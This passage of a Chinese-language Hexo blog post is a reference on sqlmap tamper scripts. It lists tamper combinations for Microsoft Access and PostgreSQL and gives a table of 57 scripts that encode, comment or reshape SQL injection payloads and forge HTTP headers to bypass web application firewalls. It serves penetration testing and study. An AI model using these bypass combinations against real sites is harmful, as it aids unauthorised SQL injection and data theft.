+<h5 id="Microsoft-Access"><a href="#Microsoft-Access" class="headerlink" title="Microsoft Access"></a>Microsoft Access</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords</span><br></pre></td></tr></table></figure>
+
+<h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="center">脚本名称</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">apostrophemask</td>
+<td align="center">单引号替换为Utf8字符</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">apostrophenullencode</td>
+<td align="center">替换双引号为%00%27</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">appendnullbyte</td>
+<td align="center">有效代码后添加%00</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">base64encode</td>
+<td align="center">使用base64编码</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">between</td>
+<td align="center">比较符替换为between</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">bluecoat</td>
+<td align="center">空格替换为随机空白字符，等号替换为like</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td align="center">chardoubleencode</td>
+<td align="center">双url编码</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="center">charencode</td>
+<td align="center">将url编码</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="center">charunicodeencode</td>
+<td align="center">使用unicode编码</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td align="center">charunicodeescape</td>
+<td align="center">以指定的payload反向编码未编码的字符</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td align="center">commalesslimit</td>
+<td align="center">改变limit语句的写法</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td align="center">commalessmid</td>
+<td align="center">改变mid语句的写法</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td align="center">commentbeforeparentheses</td>
+<td align="center">在括号前加内联注释</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td align="center">concat2concatws</td>
+<td align="center">替换CONCAT为CONCAT_WS</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td align="center">equaltolike</td>
+<td align="center">等号替换为like</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td align="center">escapequotes</td>
+<td align="center">双引号替换为\\</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td align="center">greatest</td>
+<td align="center">大鱼号替换为greatest</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td align="center">halfversionedmorekeywords</td>
+<td align="center">在每个关键字前加注释</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td align="center">hex2char</td>
+<td align="center">将每个编码后的字符转换为等价表达</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td align="center">htmlencode</td>
+<td align="center">html编码所有非字母和数字的字符</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td align="center">ifnull2casewhenisnull</td>
+<td align="center">改变ifnull语句的写法</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">ifnull2ifisnull</td>
+<td align="center">替换ifnull为if(isnull(A))</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td align="center">informationschemacomment</td>
+<td align="center">标示符后添加注释</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td align="center">least</td>
+<td align="center">替换大于号为least</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td align="center">lowercase</td>
+<td align="center">全部替换为小写值</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td align="center">luanginx</td>
+<td align="center">用于绕过Lua nginx WAF,Lua nginx WAF不支持处理超过100个参数</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td align="center">modsecurityversioned</td>
+<td align="center">空格替换为查询版本的注释</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td align="center">modsecurityzeroversioned</td>
+<td align="center">添加完整的查询版本的注释</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td align="center">multiplespaces</td>
+<td align="center">添加多个空格</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td align="center">overlongutf8</td>
+<td align="center">将所有字符转义为utf8</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td align="center">overlongutf8more</td>
+<td align="center">以指定的payload转换所有字符</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td align="center">percentage</td>
+<td align="center">每个字符前添加%</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td align="center">plus2concat</td>
+<td align="center">将加号替换为concat函数</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td align="center">plus2fnconcat</td>
+<td align="center">将加号替换为ODBC函数{fnCONCAT()}</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td align="center">randomcase</td>
+<td align="center">字符大小写随机替换</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td align="center">randomcomments</td>
+<td align="center">/**/分割关键字</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td align="center">sp_password</td>
+<td align="center">追加sp_password字符串</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td align="center">space2comment</td>
+<td align="center">空格替换为/**/</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td align="center">space2dash</td>
+<td align="center">空格替换为-加随机字符</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td align="center">space2hash</td>
+<td align="center">空格替换为#加随机字符</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td align="center">space2morecomment</td>
+<td align="center">空格替换为/<strong>_</strong>/</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td align="center">space2morehash</td>
+<td align="center">空格替换为#加随机字符及换行符</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td align="center">space2mssqlblank</td>
+<td align="center">空格替换为其他空符号</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td align="center">space2mssqlhash</td>
+<td align="center">空格替换为%23%0A</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td align="center">space2mysqlblank</td>
+<td align="center">空格替换为其他空白符号</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td align="center">space2mysqldash</td>
+<td align="center">空格替换为-%0A</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td align="center">space2plus</td>
+<td align="center">空格替换为加号</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td align="center">space2randomblank</td>
+<td align="center">空格替换为备选字符集中的随机字符</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td align="center">substring2leftright</td>
+<td align="center">PostgreSQL中将substring函数用left right函数代替</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td align="center">symbliclogical</td>
+<td align="center">AND和OR替换为&amp;&amp;和</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td align="center">unionalltounion</td>
+<td align="center">union all select 替换为union select</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td align="center">unmagicquotes</td>
+<td align="center">宽字符绕过GPC</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td align="center">uppercase</td>
+<td align="center">全部替换为大写值</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td align="center">varnish</td>
+<td align="center">添加HTTP头</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td align="center">versionedkeywords</td>
+<td align="center">用注释封装每个非函数的关键字</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td align="center">versionedmorekewords</td>
+<td align="center">使用注释绕过</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td align="center">xforwardedfor</td>
+<td align="center">添加伪造的HTTP头</td>
+</tr>
+</tbody></table>
+<p> 参考文章：</p>
+<p> <a href="https://blog.csdn.net/nzjdsds/article/details/77416060" target="_blank" rel="noopener">使用sqlmap中tamper脚本绕过waf</a><br> <a href="http://www.storysec.com/sqlmap-tamper-script-lists.html" target="_blank" rel="noopener">sqlmap tamper 脚本列表</a><br> <a href="http://www.myh0st.cn/index.php/archives/881/" target="_blank" rel="noopener">sqlmap的tamper详解</a><br> <a href="https://www.cnblogs.com/ichunqiu/p/7570036.html" target="_blank" rel="noopener">sqlmap注入之tamper绕过WAF脚本列表</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/20/Hexo-github/" rel="next" title="Hexo-github">
+                <i class="fa fa-chevron-left"></i> Hexo-github
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/26/Breach-1-0/" rel="prev" title="Breach-1.0">
+                Breach-1.0 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Guko</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用方法"><span class="nav-number">1.</span> <span class="nav-text">使用方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#各个tamper的作用"><span class="nav-number">2.</span> <span class="nav-text">各个tamper的作用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-apostrophemask-py"><span class="nav-number">2.1.</span> <span class="nav-text">1.apostrophemask.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-apostrophenullencode-py"><span class="nav-number">2.2.</span> <span class="nav-text">2.apostrophenullencode.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-appendnullbyte-py"><span class="nav-number">2.3.</span> <span class="nav-text">3.appendnullbyte.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-base64encode-py"><span class="nav-number">2.4.</span> <span class="nav-text">4.base64encode.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-between-py"><span class="nav-number">2.5.</span> <span class="nav-text">5.between.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-bluecoat-py"><span class="nav-number">2.6.</span> <span class="nav-text">6.bluecoat.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-chardoubleencode-py"><span class="nav-number">2.7.</span> <span class="nav-text">7.chardoubleencode.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-charencode-py"><span class="nav-number">2.8.</span> <span class="nav-text">8.charencode.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-charunicodeencode-py"><span class="nav-number">2.9.</span> <span class="nav-text">9.charunicodeencode.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-charunicodeescape-py"><span class="nav-number">2.10.</span> <span class="nav-text">10.charunicodeescape.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#11-commalesslimit-py"><span class="nav-number">2.11.</span> <span class="nav-text">11.commalesslimit.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#12-commalessmid-py"><span class="nav-number">2.12.</span> <span class="nav-text">12.commalessmid.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-commentbeforeparentheses-py"><span class="nav-number">2.13.</span> <span class="nav-text">13.commentbeforeparentheses.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#14-concat2concatws-py"><span class="nav-number">2.14.</span> <span class="nav-text">14.concat2concatws.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#15-equaltolike-py"><span class="nav-number">2.15.</span> <span class="nav-text">15.equaltolike.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#16-escapequotes-py"><span class="nav-number">2.16.</span> <span class="nav-text">16.escapequotes.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#17-greatest-py"><span class="nav-number">2.17.</span> <span class="nav-text">17.greatest.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#18-halfversionedmorekeywords-py"><span class="nav-number">2.18.</span> <span class="nav-text">18.halfversionedmorekeywords.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#19-hex2char-py"><span class="nav-number">2.19.</span> <span class="nav-text">19.hex2char.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#20-htmlencode-py"><span class="nav-number">2.20.</span> <span class="nav-text">20.htmlencode.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#21-ifnull2casewhenisnull-py"><span class="nav-number">2.21.</span> <span class="nav-text">21.ifnull2casewhenisnull.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#22-ifnull2ifisnull-py"><span class="nav-number">2.22.</span> <span class="nav-text">22.ifnull2ifisnull.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#23-informationschemacomment-py"><span class="nav-number">2.23.</span> <span class="nav-text">23.informationschemacomment.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#24-least-py"><span class="nav-number">2.24.</span> <span class="nav-text">24.least.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#25-lowercase-py"><span class="nav-number">2.25.</span> <span class="nav-text">25.lowercase.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#26-luanginx-py"><span class="nav-number">2.26.</span> <span class="nav-text">26.luanginx.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#27-modsecurityversioned-py"><span class="nav-number">2.27.</span> <span class="nav-text">27.modsecurityversioned.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#28-modsecurityzeroversioned-py"><span class="nav-number">2.28.</span> <span class="nav-text">28.modsecurityzeroversioned.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#29-multiplespaces-py"><span class="nav-number">2.29.</span> <span class="nav-text">29.multiplespaces.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#30-overlongutf8-py"><span class="nav-number">2.30.</span> <span class="nav-text">30.overlongutf8.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#31-overlongutf8more-py"><span class="nav-number">2.31.</span> <span class="nav-text">31.overlongutf8more.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#32-percentage-py"><span class="nav-number">2.32.</span> <span class="nav-text">32.percentage.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#33-plus2concat-py"><span class="nav-number">2.33.</span> <span class="nav-text">33.plus2concat.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#34-plus2fnconcat"><span class="nav-number">2.34.</span> <span class="nav-text">34.plus2fnconcat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#35-randomcase-py"><span class="nav-number">2.35.</span> <span class="nav-text">35.randomcase.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#36-randomcomments-py"><span class="nav-number">2.36.</span> <span class="nav-text">36.randomcomments.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#37-sp-password-py"><span class="nav-number">2.37.</span> <span class="nav-text">37.sp_password.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#38-space2comment-py"><span class="nav-number">2.38.</span> <span class="nav-text">38.space2comment.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#39-space2dash-py"><span class="nav-number">2.39.</span> <span class="nav-text">39.space2dash.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#40-space2hash-py"><span class="nav-number">2.40.</span> <span class="nav-text">40.space2hash.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#41-space2morecomment-py"><span class="nav-number">2.41.</span> <span class="nav-text">41.space2morecomment.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#42-space2morehash-py"><span class="nav-number">2.42.</span> <span class="nav-text">42.space2morehash.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#43-space2mssqlblank-py"><span class="nav-number">2.43.</span> <span class="nav-text">43.space2mssqlblank.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#44-space2mssqlhash-py"><span class="nav-number">2.44.</span> <span class="nav-text">44.space2mssqlhash.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#45-space2mysqlblank-py"><span class="nav-number">2.45.</span> <span class="nav-text">45.space2mysqlblank.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#46-space2mysqldash-py"><span class="nav-number">2.46.</span> <span class="nav-text">46.space2mysqldash.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#47-space2plu-py"><span class="nav-number">2.47.</span> <span class="nav-text">47.space2plu.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#48-space2randomblank-py"><span class="nav-number">2.48.</span> <span class="nav-text">48.space2randomblank.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#49-substring2leftright-py"><span class="nav-number">2.49.</span> <span class="nav-text">49.substring2leftright.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#50-symboliclogical-py"><span class="nav-number">2.50.</span> <span class="nav-text">50.symboliclogical.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#51-unionalltounion-py"><span class="nav-number">2.51.</span> <span class="nav-text">51.unionalltounion.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#52-unmagicquotes-py"><span class="nav-number">2.52.</span> <span class="nav-text">52.unmagicquotes.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#53-uppercase-py"><span class="nav-number">2.53.</span> <span class="nav-text">53.uppercase.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#54-varnish-py"><span class="nav-number">2.54.</span> <span class="nav-text">54.varnish.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#55-versionedkeywords-py"><span class="nav-number">2.55.</span> <span class="nav-text">55.versionedkeywords.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#56-versionedmorekeywords-py"><span class="nav-number">2.56.</span> <span class="nav-text">56.versionedmorekeywords.py</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#57-xforwardedfor-py"><span class="nav-number">2.57.</span> <span class="nav-text">57.xforwardedfor.py</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些常用的tamper组合"><span class="nav-number">3.</span> <span class="nav-text">一些常用的tamper组合</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通用的测试tamper"><span class="nav-number">3.1.</span> <span class="nav-text">通用的测试tamper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Microsoft-SQL-Server"><span class="nav-number">3.2.</span> <span class="nav-text">Microsoft SQL Server</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MySQL"><span class="nav-number">3.3.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Oracle"><span class="nav-number">3.4.</span> <span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Microsoft-Access"><span class="nav-number">3.5.</span> <span class="nav-text">Microsoft Access</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PostgreSQL"><span class="nav-number">3.6.</span> <span class="nav-text">PostgreSQL</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guko</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">15.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
